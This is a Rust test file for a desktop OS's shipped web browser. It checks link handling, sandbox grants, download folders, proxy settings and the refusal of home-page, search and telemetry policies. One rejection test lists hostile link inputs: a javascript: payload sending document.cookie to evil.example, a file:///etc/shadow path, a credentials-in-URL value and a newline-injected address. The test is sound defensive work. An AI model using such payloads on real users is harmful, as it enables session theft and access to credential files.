//! The web browser, and what it may take from the machine — held to each clause
//! of the plan's acceptance, with each refusal beside what it refuses.
//!
//! `docs/autonomy/software-and-the-web-plan.md`, task 3: the browser task 2
//! ships opens web addresses **from any application** — since 2026-11-12 with no
//! grant over it, through the open-with portal; it is **a sandboxed application like
//! any other**, holding nothing a person did not give it; its **downloads go to
//! the folder a person chose**; the **machine-wide proxy reaches it**; and
//! **nothing alo OS ships sets its home page, search engine or telemetry** —
//! beyond turning the telemetry off, which is the one thing the upstream's own
//! policy document allows to be turned off.
//!
//! The rented tool is a stand-in ([`AMachineWithABrowser`]) that offers the
//! fresh-machine list from the place a fresh machine installs from. What these
//! tests cannot show is the browser itself running on a real machine reading the
//! shipped configuration; the task's report says what would.

#![expect(
    clippy::unwrap_used,
    reason = "in a test, a panic on an unexpected None or Err is the failure being reported"
)]

use std::cell::RefCell;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

use alo_applications::{
    Application, Chosen, Declared, Installed, Link, LinkBecause, LinkKind, PassedOver,
    WhatOpensWhat, keeping,
};
use alo_capability::{Agent, Applicant, Ask, Facility, Grant, Reach, is_a_persons_own};
use alo_egress::Indicator;
use alo_software::{
    Bound, Configuration, Configured, Enabled, Failed, NeverSet, NotConfigured, Role, Setting,
    Shipped, SourceName, Tool, browser_configuration, install, installing, remove,
};
use tempfile::TempDir;

// ---------------------------------------------------------------------------
// The machine these tests look at.
// ---------------------------------------------------------------------------

/// The rented tool, standing in: one place set up, every shipped application on
/// offer there, and nothing open.
struct AMachineWithABrowser {
    /// What is installed at the moment.
    installed: RefCell<Vec<String>>,
}

impl AMachineWithABrowser {
    fn new() -> Self {
        Self {
            installed: RefCell::new(Vec::new()),
        }
    }

    /// Every application a fresh machine ships, by identifier.
    fn shipped() -> Vec<String> {
        Shipped::decided()
            .unwrap()
            .every()
            .iter()
            .map(|pinned| pinned.application().identifier().to_owned())
            .collect()
    }
}

impl Tool for AMachineWithABrowser {
    fn sources(&self) -> Result<Vec<Configured>, Failed> {
        Ok(vec![Configured {
            name: "flathub".to_owned(),
            address: "https://dl.flathub.org/repo/".to_owned(),
            checks_signatures: true,
            switched_off: false,
        }])
    }

    fn installed(&self) -> Result<Vec<String>, Failed> {
        Ok(self.installed.borrow().clone())
    }

    fn open(&self) -> Result<Vec<String>, Failed> {
        Ok(Vec::new())
    }

    fn install(&self, _: &SourceName, application: &Application) -> Result<(), Failed> {
        if !Self::shipped().contains(&application.identifier().to_owned()) {
            return Err(Failed::NotOffered);
        }
        self.installed
            .borrow_mut()
            .push(application.identifier().to_owned());
        Ok(())
    }

    fn updates(&self, _: &SourceName) -> Result<Vec<String>, Failed> {
        Ok(Vec::new())
    }

    fn update(&self, _: &Application) -> Result<(), Failed> {
        Ok(())
    }

    fn remove(&self, application: &Application) -> Result<(), Failed> {
        let mut installed = self.installed.borrow_mut();
        let before = installed.len();
        installed.retain(|here| here != application.identifier());
        if installed.len() == before {
            return Err(Failed::NotInstalled);
        }
        Ok(())
    }
}

fn noon() -> SystemTime {
    SystemTime::UNIX_EPOCH + Duration::from_secs(1_760_000_000)
}

fn hour() -> Duration {
    Duration::from_secs(60 * 60)
}

/// This repository, from the crate this test is in.
fn the_repository() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .canonicalize()
        .unwrap()
}

/// The application this machine ships for the web.
fn the_browser() -> Application {
    Shipped::decided()
        .unwrap()
        .the(Role::WebBrowser)
        .application()
        .clone()
}

/// Install everything a fresh machine ships, each through the same two steps a
/// person's installation takes.
fn a_fresh_machine(tool: &AMachineWithABrowser) {
    let enabled = Enabled::read(tool, Bound::Nobodys).unwrap();
    let mut indicator = Indicator::default();
    for pinned in Shipped::decided().unwrap().every() {
        let wanted = pinned.wanted();
        let errand = installing(&enabled, &wanted, tool).unwrap();
        let underway = indicator.beginning_on_its_own(errand, noon());
        install(&underway, &enabled, wanted, tool).unwrap();
        indicator.ended_on_its_own(underway);
    }
    assert!(indicator.is_quiet());
}

/// What a desktop entry for this application lists under `MimeType`, on the
/// machine these tests stand in for.
///
/// **The browser declares web links, as Firefox's own entry does**, and that
/// declaration — not its being the one this machine ships — is what makes it
/// the answer. **The terminal is written as declaring them too**, which no
/// terminal this machine ships does: it is there so that *a link is never
/// handed to a terminal* is tested against a terminal that asks for links,
/// rather than one that merely never came up.
fn what_its_entry_declares(identifier: &str) -> &'static str {
    let shipped = Shipped::decided().unwrap();
    if identifier == shipped.the(Role::WebBrowser).application().identifier() {
        "text/html;x-scheme-handler/http;x-scheme-handler/https;"
    } else if identifier == shipped.the(Role::Terminal).application().identifier() {
        "x-scheme-handler/http;x-scheme-handler/https;"
    } else {
        ""
    }
}

/// This machine as the open-with portal reads it: a desktop entry for every
/// application the tool has installed, read back by `alo-installed`, and the
/// person's own `what-opens-what.toml`, holding `[links] web = …` when they
/// chose a browser.
struct AsThePortalReadsIt {
    /// Where the entries and the file are; removed when this is dropped.
    _folder: TempDir,
    installed: Installed,
    declared: Declared,
    chosen: Chosen,
}

impl AsThePortalReadsIt {
    fn of(tool: &AMachineWithABrowser, chose_for_the_web: Option<&str>) -> Self {
        let folder = tempfile::tempdir().unwrap();
        let entries = folder.path().join("applications");
        fs::create_dir(&entries).unwrap();
        for identifier in tool.installed().unwrap() {
            // An application that declares nothing has no `MimeType` line,
            // which is how most entries are written.
            let declares = match what_its_entry_declares(&identifier) {
                "" => String::new(),
                listed => format!("MimeType={listed}\n"),
            };
            fs::write(
                entries.join(format!("{identifier}.desktop")),
                format!("[Desktop Entry]\nType=Application\nName={identifier}\n{declares}"),
            )
            .unwrap();
        }
        let (installed, declared) = alo_installed::read_with_what_they_open(&[entries]);
        let file = folder.path().join(keeping::THE_FILE);
        if let Some(web) = chose_for_the_web {
            fs::write(&file, format!("format = 1\n\n[links]\nweb = \"{web}\"\n")).unwrap();
        }
        let chosen = keeping::read(&file).unwrap();
        Self {
            _folder: folder,
            installed,
            declared,
            chosen,
        }
    }

    fn what_opens(&self) -> WhatOpensWhat<'_> {
        WhatOpensWhat::on(&self.installed, &self.declared, &self.chosen)
    }
}

// ---------------------------------------------------------------------------
// It opens web addresses, from any application.
// ---------------------------------------------------------------------------

/// **The browser a fresh machine ships is what opens web links**, because its
/// desktop entry declares them and the person chose nothing — the answer the
/// open-with portal gives (`alo_applications::WhatOpensWhat::what_opens_links`).
/// It needs nothing from the grants: since the owner's decision of 2026-11-12
/// (*"No — open in my default, but record it"*) a link the person followed
/// opens in their default browser whichever application it was in, with no
/// grant over the browser.
///
/// **And the person's `[links]` choice wins over it** — here the browser itself,
/// chosen by name, which is the row Settings → Default apps writes.
#[test]
fn the_browser_a_fresh_machine_ships_opens_web_addresses() {
    let tool = AMachineWithABrowser::new();
    a_fresh_machine(&tool);
    let browser = the_browser();

    let machine = AsThePortalReadsIt::of(&tool, None);
    let answer = machine.what_opens().what_opens_links(LinkKind::Web).unwrap();
    assert_eq!(answer.application().identifier(), browser.identifier());
    assert_eq!(answer.because(), &LinkBecause::ItDeclaresIt);

    let chosen = AsThePortalReadsIt::of(&tool, Some(browser.identifier()));
    let answer = chosen.what_opens().what_opens_links(LinkKind::Web).unwrap();
    assert_eq!(answer.application().identifier(), browser.identifier());
    assert_eq!(answer.because(), &LinkBecause::ThePersonChoseIt);
}

/// **Only the open web, and an email address, are links.** A path on this
/// machine, a document the asking application wrote itself, code, the
/// browser's own settings, a password in an address and two lines are each
/// refused by `alo_applications::Link`, the check the portal makes before
/// anything else.
#[test]
fn nothing_but_the_open_web_and_an_email_address_is_a_link() {
    for address in [
        "file:///etc/shadow",
        "file:///home/anna/Taxes/2024.pdf",
        "javascript:fetch('https://evil.example/'+document.cookie)",
        "data:text/html,<script>",
        "about:config",
        "https://anna:hunter2@example.com/",
        "https://example.com/\nGET /",
        "",
    ] {
        assert!(Link::checked(address).is_err(), "{address:?} is a link");
    }
    assert_eq!(
        Link::checked("https://example.com/a?b=c#d").unwrap().kind(),
        LinkKind::Web
    );
    assert_eq!(
        Link::checked("mailto:anna@example.com").unwrap().kind(),
        LinkKind::Mail
    );
}

/// **A person may remove the browser, and then web links open in nothing** —
/// not in the terminal a fresh machine also ships, even though its entry here
/// declares web links and even where the person chose it under `[links]`, and
/// not in anything installed that does not declare them.
#[test]
fn a_machine_whose_browser_was_removed_opens_web_addresses_in_nothing() {
    let tool = AMachineWithABrowser::new();
    a_fresh_machine(&tool);
    let mut machine = Agent::present();
    let browser = the_browser();
    remove(browser.clone(), &tool, &mut machine, noon()).unwrap();

    let shipped = Shipped::decided().unwrap();
    let terminal = shipped.the(Role::Terminal).application().identifier();
    assert!(is_a_persons_own(terminal));

    let nobody_chose = AsThePortalReadsIt::of(&tool, None);
    assert!(nobody_chose.installed.knows(terminal).is_some());
    assert!(
        nobody_chose
            .declared
            .declaring_links(LinkKind::Web)
            .any(|declaring| declaring == terminal),
        "the terminal's entry was meant to declare web links, so its refusal is tested"
    );
    let nothing = nobody_chose
        .what_opens()
        .what_opens_links(LinkKind::Web)
        .unwrap_err();
    assert_eq!(nothing.passed_over(), None);

    let chose_the_terminal = AsThePortalReadsIt::of(&tool, Some(terminal));
    let nothing = chose_the_terminal
        .what_opens()
        .what_opens_links(LinkKind::Web)
        .unwrap_err();
    assert_eq!(
        nothing.passed_over(),
        Some(&PassedOver::ATerminal(terminal.to_owned()))
    );

    // With the browser back, the terminal is still never the answer.
    let enabled = Enabled::read(&tool, Bound::Nobodys).unwrap();
    let mut indicator = Indicator::default();
    let wanted = shipped.the(Role::WebBrowser).wanted();
    let errand = installing(&enabled, &wanted, &tool).unwrap();
    let underway = indicator.beginning_on_its_own(errand, noon());
    install(&underway, &enabled, wanted, &tool).unwrap();
    indicator.ended_on_its_own(underway);

    let back = AsThePortalReadsIt::of(&tool, Some(terminal));
    let answer = back.what_opens().what_opens_links(LinkKind::Web).unwrap();
    assert_eq!(answer.application().identifier(), browser.identifier());
    assert_eq!(
        answer.because(),
        &LinkBecause::ItDeclaresItAndTheChoiceIsATerminal {
            chosen: terminal.to_owned()
        }
    );
}

// ---------------------------------------------------------------------------
// It is an application like any other.
// ---------------------------------------------------------------------------

/// **The browser is a sandboxed application like any other, with no grants
/// beyond what a person gives it.** It arrives holding nothing; it reaches no
/// folder and no facility until a person allows it one; what they allow is
/// exactly what it reaches and nothing beside it; and removing it ends what it
/// held.
#[test]
fn the_browser_is_an_application_like_any_other_and_arrives_granted_nothing() {
    let tool = AMachineWithABrowser::new();
    let mut machine = Agent::present();
    a_fresh_machine(&tool);
    let browser = the_browser();
    let asking = Applicant::named(browser.identifier());

    assert_eq!(
        machine.grants().unwrap().len(),
        0,
        "the browser arrived holding a grant"
    );
    assert!(!machine.grants().unwrap().allows_anything(&asking, noon()));
    assert!(
        !is_a_persons_own(browser.identifier()),
        "the browser is not a person's own application: an agent may be granted it, and a person \
         may remove it"
    );

    // Nothing this machine has is reachable until a person says so.
    for wanted in [
        Ask::path("/home/anna/Downloads/march.pdf"),
        Ask::path("/home/anna"),
        Ask::facility(Facility::Camera),
        Ask::facility(Facility::Microphone),
        Ask::facility(Facility::ScreenOnce),
        Ask::application("app.devsuite.Ptyxis"),
    ] {
        assert!(
            machine
                .grants()
                .unwrap()
                .allowing(&asking, &wanted, noon())
                .is_err(),
            "{wanted:?} was reachable by an application nobody granted anything"
        );
    }

    // A person allows it one folder. That is what it reaches, and no more.
    let downloads = PathBuf::from("/home/anna/Downloads");
    machine.grants_mut().unwrap().grant(
        Grant::checked_for(
            &asking.grantee(),
            Reach::Folder(downloads.clone()),
            noon(),
            hour(),
        )
        .unwrap(),
    );
    let grants = machine.grants().unwrap();
    assert!(
        grants
            .allowing(
                &asking,
                &Ask::path("/home/anna/Downloads/march.pdf"),
                noon()
            )
            .is_ok()
    );
    for beyond in [
        Ask::path("/home/anna/Taxes/2024.pdf"),
        Ask::path("/etc/alo/agentd.toml"),
        Ask::facility(Facility::Camera),
    ] {
        assert!(
            grants.allowing(&asking, &beyond, noon()).is_err(),
            "{beyond:?} reached beyond the one folder a person gave it"
        );
    }

    // And removing it ends what it held, in the same act.
    let removed = remove(browser, &tool, &mut machine, noon()).unwrap();
    assert_eq!(removed.grants_ended(), 1);
    assert_eq!(machine.grants().unwrap().len(), 0);
}

// ---------------------------------------------------------------------------
// Its downloads, the machine's proxy, and what alo OS sets.
// ---------------------------------------------------------------------------

/// **A download goes to the folder a person chose.** The shipped configuration
/// makes the browser ask where each one is saved and names no folder of its own,
/// so the folder is one a person picked in the moment; and until they have
/// picked one, the browser reaches no folder at all.
#[test]
fn a_download_goes_to_the_folder_the_person_chose() {
    let configuration = Configuration::decided().unwrap();
    assert!(configuration.asks_where_each_download_goes());
    assert!(configuration.sets_no_download_folder());
    assert!(configuration.names(Setting::AskWhereEachDownloadGoes.key()));

    for folder in [NeverSet::DownloadFolder, NeverSet::DefaultDownloadFolder] {
        assert_eq!(
            Configuration::read(&with(&[(folder.key(), "\"/home/anna/Downloads\"")])).unwrap_err(),
            NotConfigured::NeverSet(folder)
        );
    }

    // And the promise underneath it: the browser holds no folder until a person
    // gives it one.
    let tool = AMachineWithABrowser::new();
    a_fresh_machine(&tool);
    let machine = Agent::present();
    let asking = Applicant::named(the_browser().identifier());
    assert!(
        machine
            .grants()
            .unwrap()
            .allowing(
                &asking,
                &Ask::path("/home/anna/Downloads/march.pdf"),
                noon()
            )
            .is_err()
    );
}

/// **The machine's one proxy reaches the browser**, because the shipped
/// configuration writes none: an organisation or the person sets one road out,
/// machine-wide, and a browser holding a second copy of it would be a machine
/// with two answers. A configuration that wrote one is refused, naming what it
/// would have taken.
#[test]
fn the_machines_one_proxy_reaches_the_browser() {
    let configuration = Configuration::decided().unwrap();
    assert!(configuration.takes_the_machines_proxy());
    assert!(!configuration.names(NeverSet::Proxy.key()));

    let refused = Configuration::read(&with(&[(
        NeverSet::Proxy.key(),
        "{\"Mode\": \"manual\", \"HTTPProxy\": \"proxy.example.com:3128\"}",
    )]))
    .unwrap_err();
    assert_eq!(refused, NotConfigured::NeverSet(NeverSet::Proxy));
    assert!(
        refused.to_string().contains("machine-wide"),
        "the refusal does not say why: {refused}"
    );
}

/// **Nothing alo OS ships sets its home page, its search engine or its
/// telemetry** — beyond turning the telemetry off, which is the whole of what
/// the upstream's own policy document allows to be turned off. The shipped
/// configuration is read off the disk, is the one built into this crate, and
/// sets three things: no usage data, no experiments, and *ask where each
/// download goes*. Every key that would take one of the person's own choices is
/// refused, naming what it would have taken.
#[test]
fn nothing_alo_os_ships_sets_its_home_page_search_engine_or_telemetry() {
    let on_the_disk =
        fs::read_to_string(the_repository().join(browser_configuration::WHERE_IT_IS)).unwrap();
    assert_eq!(on_the_disk, browser_configuration::THE_CONFIGURATION);

    let configuration = Configuration::read(&on_the_disk).unwrap();
    assert_eq!(configuration, Configuration::decided().unwrap());
    assert_eq!(configuration.sets(), Setting::EVERY.as_slice());
    assert_eq!(
        configuration.sets().len(),
        3,
        "alo OS ships more settings with the browser than it decided to"
    );

    // The telemetry is off, and it is the only thing about the browser's own
    // behaviour that is set.
    assert!(configuration.telemetry_is_off());
    assert!(configuration.sets_no_home_page());
    assert!(configuration.sets_no_search_engine());

    // Every one of the person's own choices is refused, and says what it would
    // have taken.
    for never in NeverSet::EVERY {
        let refused = Configuration::read(&with(&[(never.key(), "true")])).unwrap_err();
        assert_eq!(refused, NotConfigured::NeverSet(never), "{}", never.key());
        assert!(refused.to_string().contains(never.takes()), "{refused}");
    }
    for (key, value) in [
        ("Homepage", "{\"URL\": \"https://alo.example/\"}"),
        (
            "SearchEngines",
            "{\"Default\": \"a search engine somebody paid for\"}",
        ),
        ("Preferences", "{\"browser.startup.homepage\": \"x\"}"),
    ] {
        assert!(
            matches!(
                Configuration::read(&with(&[(key, value)])),
                Err(NotConfigured::NeverSet(_))
            ),
            "{key} was accepted"
        );
    }

    // And nothing arrives as text on a key that is decided.
    assert_eq!(
        Configuration::read(&only(&[
            (Setting::TelemetryOff.key(), "\"https://example.com/\""),
            (Setting::ExperimentsOff.key(), "true"),
            (Setting::AskWhereEachDownloadGoes.key(), "true"),
        ]))
        .unwrap_err(),
        NotConfigured::NotTrue {
            key: Setting::TelemetryOff.key().to_owned()
        }
    );

    // A document that quietly stopped turning the telemetry off is refused.
    assert_eq!(
        Configuration::read(&only(&[
            (Setting::ExperimentsOff.key(), "true"),
            (Setting::AskWhereEachDownloadGoes.key(), "true"),
        ]))
        .unwrap_err(),
        NotConfigured::Missing {
            key: Setting::TelemetryOff.key().to_owned()
        }
    );
}

/// The shipped configuration with these keys added to it.
fn with(extra: &[(&str, &str)]) -> String {
    let mut keys: Vec<(String, String)> = Setting::EVERY
        .into_iter()
        .map(|one| (one.key().to_owned(), "true".to_owned()))
        .collect();
    keys.extend(
        extra
            .iter()
            .map(|(key, value)| ((*key).to_owned(), (*value).to_owned())),
    );
    written(&keys)
}

/// A configuration setting exactly these keys.
fn only(keys: &[(&str, &str)]) -> String {
    let keys: Vec<(String, String)> = keys
        .iter()
        .map(|(key, value)| ((*key).to_owned(), (*value).to_owned()))
        .collect();
    written(&keys)
}

/// Those keys, as the browser's own document notation writes them.
fn written(keys: &[(String, String)]) -> String {
    let inside: Vec<String> = keys
        .iter()
        .map(|(key, value)| format!("    \"{key}\": {value}"))
        .collect();
    format!("{{\n  \"policies\": {{\n{}\n  }}\n}}\n", inside.join(",\n"))
}
